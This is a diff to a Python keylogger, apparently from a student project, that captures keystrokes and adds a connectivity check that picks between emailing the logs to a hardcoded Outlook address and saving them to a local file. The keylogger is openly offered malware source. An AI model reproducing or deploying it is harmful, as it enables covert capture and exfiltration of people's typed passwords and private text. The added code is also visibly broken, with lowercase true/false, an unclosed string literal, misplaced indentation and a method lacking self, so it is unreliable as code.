@@ -8,6 +8,7 @@ from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from cryptography.fernet import Fernet
+import urllib.request
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "cs455group3@outlook.com"
@@ -139,12 +140,23 @@ class Keylogger:
         print(f"{datetime.now()} - Started keylogger")
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
+        
+   def connect(host='http://google.com'):
+        try:
+            urllib.request.urlopen(host)
+            return true
+        except:
+            return false
 
         
 if __name__ == "__main__":
     # if you want a keylogger to send to your email
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # if you want a keylogger to record keylogs to a local file 
+    if connect():
+        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email)
+                              
+    # if you want a keylogger to record keylogs to a local file                          
+    else:
+        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+     
     # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
